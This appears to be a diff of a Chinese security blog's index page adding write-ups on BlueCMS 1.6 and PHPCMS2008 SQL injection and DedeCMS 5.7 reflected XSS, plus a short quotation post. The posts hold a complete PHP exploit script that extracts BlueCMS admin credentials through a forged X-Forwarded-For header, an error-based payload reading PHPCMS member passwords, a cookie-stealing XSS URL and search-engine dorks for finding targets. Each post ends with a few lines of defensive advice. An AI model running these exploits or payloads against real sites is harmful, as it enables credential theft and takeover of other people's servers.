@@ -150,6 +150,413 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-BlueCMS-1-6-SQL-注入漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/27/BlueCMS-1-6-SQL-注入漏洞/">BlueCMS 1.6 SQL 注入漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2018/11/27/BlueCMS-1-6-SQL-注入漏洞/" class="archive-article-date">
+  	<time datetime="2018-11-27T05:46:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-27</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>BlueCMS是一款国产的CMS平台，十分灵活、方便，早些年广泛的应用于商业系统、个人博客等。</p>
+<p>程序在使用getip()函数获取客户端ip时没有严格过滤数据，导致sql注入漏洞，攻击者通过SQL注入漏洞可直接获取到管理员的账号密码，危害严重</p>
+<h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>BlueCMS V1.6 SP1</p>
+<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者通过SQL注入漏洞，可直接获取到管理员的账号密码，或者数据库中其他信息，进一步能获取到Webshell，甚至危害服务器的安全。</p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞出现在<code>/comment.php</code> ，关键代码如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elseif($act == 'send')</span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">sql = "<span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">".table('comment')."</span> (com_id, post_id, user_id, <span class="keyword">type</span>, mood, <span class="keyword">content</span>, pub_date, ip, is_check)<span class="keyword">VALUES</span> (<span class="string">''</span>, <span class="string">'id'</span>, <span class="string">'user_id'</span>, <span class="string">'type'</span>, <span class="string">'mood'</span>, <span class="string">'content'</span>, <span class="string">'timestamp'</span>, <span class="string">'".getip()."'</span>, <span class="string">'is_check'</span>)<span class="string">"; </span></span><br><span class="line"><span class="string">db-&gt;query(sql);</span></span><br></pre></td></tr></table></figure>
+<p>在上述代码中，构造了一个查询语句，赋值给$sql变量，接下来直接执行了此语句，没有进行任何过滤。我们可以看到在sql语句中，有一个值为<code>getip</code> ，这个变量是用户可控的。</p>
+<p>接下来通过搜索找到getip的位置，位于<code>/include/common.fun.php</code>，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">if</span> (getenv(<span class="string">'HTTP_CLIENT_IP'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_CLIENT_IP'</span>);        <span class="comment">//可伪造</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_X_FORWARDED_FOR'</span>);  <span class="comment">//可伪造</span></span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_X_FORWARDED'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_X_FORWARDED'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_FORWARDED_FOR'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">elseif</span> (getenv(<span class="string">'HTTP_FORWARDED'</span>))&#123;</span><br><span class="line">    $ip = getenv(<span class="string">'HTTP_FORWARDED'</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">    ip = _SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>上述代码首先从环境变量中取得用户的ip，如果正常取得ip，则正常返回，如果不存在，则获取客户端用代理服务器访问时的ip，如果还是没有，就继续取<code>X_FORWARDED_FOR</code>的值。</p>
+<p>可以看出来，这里的代码没有经过任何处理，直接取值，然后将取得的值带入到<code>Getip</code>中，因此我们可以通过伪造<code>X_FORWARDED_FOR</code>，构造恶意语句，通过注入，获取数据库敏感信息。</p>
+<p>直接利用Payload获取目标网页目录账号密码。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>payload构造：<code>00’,’1’),(“,’1’,’0’,’1’,’6’,(select  concat(‘&lt;u-‘,admin_name,’-u&gt;&lt;p-‘,pwd,’-p&gt;’)from  blue_admin),’1281181973’,’99</code>闭合前一个语句，插入下一个语句，能够回显查询语句；</p>
+<p>利用http请求头修改插件：firefox浏览器的插件tamper  data、http live  headers或者burpsuit</p>
+<p>开启tamper data，点击提交正常评论，捕获请求tamper，其余请求submit。</p>
+<p>http请求头处插入一个字段+payload;</p>
+<p>右键查看源代码，管理员账号与密码在页面中。</p>
+<p>或者：</p>
+<p>使用如下命令进入目录：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd c:\Program Files\phpstudy\php52</span><br></pre></td></tr></table></figure>
+<p>接下来运行payload，使用命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php.exe 1.php xx.xx.xx.xx /Blue/</span><br></pre></td></tr></table></figure>
+<p>上面的命令，意思是：使用php.exe去执行1.php，并设置了ip为xx.xx.xx.xx，目录为Blue。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.php sql injection exploit</span></span><br><span class="line">print_r(<span class="string">'</span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line"><span class="string">BlueCMS v1.6 sp1 Getip() Remote SQL Injection Exploit</span></span><br><span class="line"><span class="string">+---------------------------------+</span></span><br><span class="line"><span class="string">'</span>);    </span><br><span class="line"><span class="keyword">if</span> ($argc &lt; <span class="number">3</span>)&#123;</span><br><span class="line">    print_r(<span class="string">'</span></span><br><span class="line"><span class="string">+----------------------------------------+</span></span><br><span class="line"><span class="string">Example:</span></span><br><span class="line"><span class="string">php '</span>.$argv[<span class="number">0</span>].<span class="string">' localhost /bluecms/</span></span><br><span class="line"><span class="string">+----------------------------------------+</span></span><br><span class="line"><span class="string">'</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">7</span>);</span><br><span class="line">ini_set(<span class="string">'max_execution_time'</span>,<span class="number">0</span>);</span><br><span class="line">$host = $argv[<span class="number">1</span>];</span><br><span class="line">$path = $argv[<span class="number">2</span>];</span><br><span class="line">send();</span><br><span class="line">send2();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $host, $path;</span><br><span class="line">    $cmd = <span class="string">"mood=6&amp;comment=test&amp;id=1&amp;type=1&amp;submit=%CC%E1%BD%BB%C6%C0%C2%DB"</span>;</span><br><span class="line">    $getinj=<span class="string">" 00','1'),('','1','0','1','6',(select concat('&lt;u-',admin_name,'-u&gt;&lt;p-',pwd,'-p&gt;') from blue_admin),'1281181973','99"</span>;</span><br><span class="line">    $data = <span class="string">"POST "</span>.$path.<span class="string">"comment.php?act=send HTTP/1.1\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Accept: */*\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Accept-Language: zh-cn\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Content-Type: application/x-www-form-urlencoded\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Host: $host\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Content-Length: "</span>.strlen($cmd).<span class="string">"\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"Connection: Close\r\n"</span>;</span><br><span class="line">    $data .= <span class="string">"X-Forwarded-For: $getinj\r\n\r\n"</span>;</span><br><span class="line">    $data .= $cmd;</span><br><span class="line">	</span><br><span class="line">    $fp = fsockopen($host,<span class="number">80</span>);</span><br><span class="line">    fputs($fp,$data);</span><br><span class="line">    </span><br><span class="line">    $resp = <span class="string">''</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">while</span> ($fp &amp;&amp; !feof($fp))</span><br><span class="line">        $resp .= fread($fp,<span class="number">1024</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $resp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send2</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $host, $path;</span><br><span class="line">    $message = <span class="string">"GET "</span>.$path.<span class="string">"news.php?id=1 HTTP/1.1\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Accept: image/gif,image/jpeg.image/pjpeg,image/pjpeg,application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/xaml+xml, application/vnd.ms-xpsdocument, application/x-ms-xbap, application/x-ms-application, */*\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Accept-Language: zh-cn\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Accept-Encoding: gzip, deflate\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0;.NET CLR 2.0.50727;GreenBrowser)\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Host: $host\r\n"</span>;</span><br><span class="line">    $message .= <span class="string">"Connection:Keep-Alive\r\n\r\n"</span>;</span><br><span class="line">    $fd = fsockopen($host,<span class="string">'80'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!$fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'[-]No response from'</span>.$host;</span><br><span class="line">        <span class="keyword">die</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fputs($fd,$message);</span><br><span class="line">    $resp = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">while</span> (!feof($fd))&#123;</span><br><span class="line">        $resp.=fgets($fd);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fd);</span><br><span class="line">    preg_match_all(<span class="string">"/&lt;u-([^&lt;]*)-u&gt;&lt;p-([^&lt;]*)-p&gt;/"</span>,$resp,$db);</span><br><span class="line">    <span class="keyword">if</span>($db[<span class="number">1</span>][<span class="number">0</span>]&amp;$db[<span class="number">2</span>][<span class="number">0</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username-&gt;"</span>.$db[<span class="number">1</span>][<span class="number">0</span>].<span class="string">"\r\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"password-&gt;"</span>.$db[<span class="number">2</span>][<span class="number">0</span>].<span class="string">"\r\n"</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"[+]congratulation ^^"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">'[-]exploited fail &gt;"&lt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><ol>
+<li>过滤转义相关参数；</li>
+<li>使用传参数的方式进行查询；  </li>
+<li>使用在线防护产品；</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/11/27/BlueCMS-1-6-SQL-注入漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-PHPCMS2008-SQL注入漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/26/PHPCMS2008-SQL注入漏洞/">PHPCMS2008 SQL注入漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2018/11/26/PHPCMS2008-SQL注入漏洞/" class="archive-article-date">
+  	<time datetime="2018-11-26T06:35:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="ZoomEye-Dork"><a href="#ZoomEye-Dork" class="headerlink" title="ZoomEye Dork"></a>ZoomEye Dork</h3><p><code>app:phpcms</code></p>
+<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>PHPCMS2008由于广告模块取referer不严，导致一处sql注入漏洞.可以得到管理员用户名与密码，攻击者登录后台后可能会获取webshell，对服务器进行进一步的渗透。</p>
+<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者通过SQL注入漏洞，获取获取后台管理员账号密码，进一步可能得到Webshell，并对服务器安全造成极大的威胁。</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞产生的位置位于<code>/ads/include/ads_place.class.php</code>的show方法中，漏洞代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($placeid)</span></span></span><br><span class="line"><span class="function">...</span></span><br><span class="line"><span class="function"><span class="title">if</span><span class="params">($adses0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(adses <span class="keyword">as</span> ads)</span><br><span class="line">&#123;</span><br><span class="line">contents[] = ads_content(ads, <span class="number">1</span>);</span><br><span class="line">this-&gt;db-&gt;query(“INSERT INTOthis-&gt;stat_table(adsid,username,ip,referer,clicktime,type)VALUES (‘ads[adsid]<span class="string">','</span>_username<span class="string">','</span>ip<span class="string">',‘this-&gt;referrer'</span>,‘$time<span class="string">',,'</span><span class="number">0</span><span class="string">')”);</span></span><br><span class="line"><span class="string">template = ads['</span>template<span class="string">'] ? $ads['</span>template<span class="string">'] : '</span>ads<span class="string">';</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，这里的$this-&gt;referrer通过this方法直接将HTTP请求头中的referer字段插入到数据库中，没有做任何过滤措施。</p>
+<p>找到了漏洞的出处，接下来寻找包含漏洞的用户可控的页面。如果漏洞是用户不可控的，比如只能管理员利用，那就相对比较鸡肋了。</p>
+<p>通过回溯法找到，在页面<code>/ads/include/commom.inc.php</code>中调用了<code>ads_place.class.php</code> 。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">...</span><br><span class="line"><span class="keyword">require</span> MOD_ROOT.<span class="string">'include/ads_place.class.php'</span>;</span><br><span class="line"><span class="keyword">require</span> MOD_ROOT.<span class="string">'include/ads.class.php'</span>;</span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>继续回溯，发现在<code>/ads/ad.php</code> 中调用了<code>/ads/include/commom.inc.php</code>，ad.php文件为用户可控文件，但ad.php大多数情况下不能访问，因此继续向上查找。</p>
+<p>发现了<code>/data/js.php</code> ，</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">chdir(&apos;../ads/&apos;);</span><br><span class="line">require &apos;./ad.php&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在用户访问首页时，会调用js.php，通过该文件可以提交有害字段，然后通过逐层调用，因此我们可以传入字段referer到危险方法show中，引入SQL注入攻击</p>
+<p><img src="/2018/11/26/PHPCMS2008-SQL注入漏洞/phpcms1.png" alt="phpcms1"></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>Tamper Data：它是火狐浏览器的一款插件，主要功能如下：</p>
+<p>可以用来查看和修改 HTTP/HTTPS 的头部和 POST 参数；<br>可以用来跟踪 HTTP 请求和响应<br>可以对 WEB 站点进行某些安全测试，用来调试 WEB 配置十分方便</p>
+<p>网址：<code>xxx/data/js.php?id=1</code></p>
+<p><u>点击Tamper之前，将下面选项中的对勾要取消掉，这样它就不会抓取下面的包了，否则它会不停的弹出抓包提醒。</u></p>
+<p>并没有找到referer 包，因此可以添加一个，并在内容里写入如下Payload：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">referer=1', (<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> (<span class="keyword">select</span> <span class="keyword">count</span>(), <span class="keyword">concat</span>(<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)<span class="number">2</span>),<span class="built_in">char</span>(<span class="number">45</span>,<span class="number">45</span>,<span class="number">45</span>),(<span class="keyword">SELECT</span> <span class="keyword">password</span> <span class="keyword">from</span> phpcms_member <span class="keyword">limit</span> <span class="number">1</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a)b), ‘<span class="number">0</span><span class="string">')#</span></span><br></pre></td></tr></table></figure>
+<h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><ul>
+<li>对相关字段进行过滤处理</li>
+<li>使用传参数方式进行数据库查询操作</li>
+<li>使用在线防护软件，如安全狗等</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/11/26/PHPCMS2008-SQL注入漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-DedeCMS-5-7-反射型XSS漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/26/DedeCMS-5-7-反射型XSS漏洞/">DedeCMS 5.7 反射型XSS漏洞</a>
+    </h1>
+  
+
+        
+        <a href="/2018/11/26/DedeCMS-5-7-反射型XSS漏洞/" class="archive-article-date">
+  	<time datetime="2018-11-26T05:33:38.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="DedeCMS-5-7-反射型XSS漏洞"><a href="#DedeCMS-5-7-反射型XSS漏洞" class="headerlink" title="DedeCMS 5.7 反射型XSS漏洞"></a>DedeCMS 5.7 反射型XSS漏洞</h2><h3 id="1-ZoomEye-DorK"><a href="#1-ZoomEye-DorK" class="headerlink" title="1.ZoomEye DorK:"></a>1.ZoomEye DorK:</h3><p><code>app:dedecms</code></p>
+<h3 id="2-Externallnterface-call"><a href="#2-Externallnterface-call" class="headerlink" title="2.Externallnterface.call"></a>2.Externallnterface.call</h3><p>此函数作为FLASH与宿主页面JavaScript通信的接口，一般来说，由“2”个参数，第一个参数为所调用JS函数名。后续的参数则为所调用的JS函数的参数。<br>那么在参数可控的情况下，不论是第一个参数还是后续参数，均能加以利用实现XSS<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> func:<span class="built_in">String</span>=root.loaderInfo.parameters.func;</span><br><span class="line"><span class="comment">//接受Flash所带的func参数</span></span><br><span class="line">ExternalInterface.call(func，<span class="string">"1"</span>);</span><br></pre></td></tr></table></figure></p>
+<p><code>http://xxx.com/xxx.swf?a=1&amp;b=2&amp;func=alert</code><br>在ActionScript（AS)里面root.loaderInfo.parameters结构如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"a"</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">"b"</span>:<span class="number">2</span>,</span><br><span class="line"><span class="string">"func"</span>:<span class="string">"alert"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>http://xxx.com/xxx.swf?func=(function(){alert(&quot;hack&quot;)})</code><br>as代码：ExternalInterface.call(“函数名”,”参数1”);<br>相当于js的：函数名(“参数1”);<br>最终浏览器执行：<br><code>try{_flash_toXML(函数名(&quot;参数1&quot;));}catch(e){&quot;&lt;undefined/&gt;&quot;;}</code></p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><code>&quot;])}catch(e){alert(1)};//</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    _flash_toXML(SWFUpload.instances[<span class="string">""</span>])</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    alert(<span class="number">1</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//"].flashReady("参数1"));&#125;catch(e)&#123;"&lt;undefined/&gt;";&#125;</span></span><br></pre></td></tr></table></figure>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>http://目标地址/images/swfupload/swfupload.swf?movieName=&quot;])}catch(e){if(!window.x){window.x=1;alert(document.cookie)}}//</code></p>
+<p><code>alert(document.cookie)</code>可自定义，比如放在盲打平台</p>
+<h3 id="反射型XSS怎么用"><a href="#反射型XSS怎么用" class="headerlink" title="反射型XSS怎么用"></a>反射型XSS怎么用</h3><p>1.欺骗<br>2.结合CSRF</p>
+<h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><p>1.对传入call的字符串进行判断或过滤操作<br>2.使用在线防护产品</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/11/26/DedeCMS-5-7-反射型XSS漏洞/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-原则" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/26/原则/">原则</a>
+    </h1>
+  
+
+        
+        <a href="/2018/11/26/原则/" class="archive-article-date">
+  	<time datetime="2018-11-26T03:51:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-26</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">时间就像一条河流，</span><br><span class="line">载着我们顺流而下，</span><br><span class="line">遇到现实，需要决策，</span><br><span class="line">但我们无法停留，</span><br><span class="line">也无法回避，</span><br><span class="line">只能以最好的方式应对。</span><br><span class="line">									              ——《原则》瑞-达利欧</span><br></pre></td></tr></table></figure>
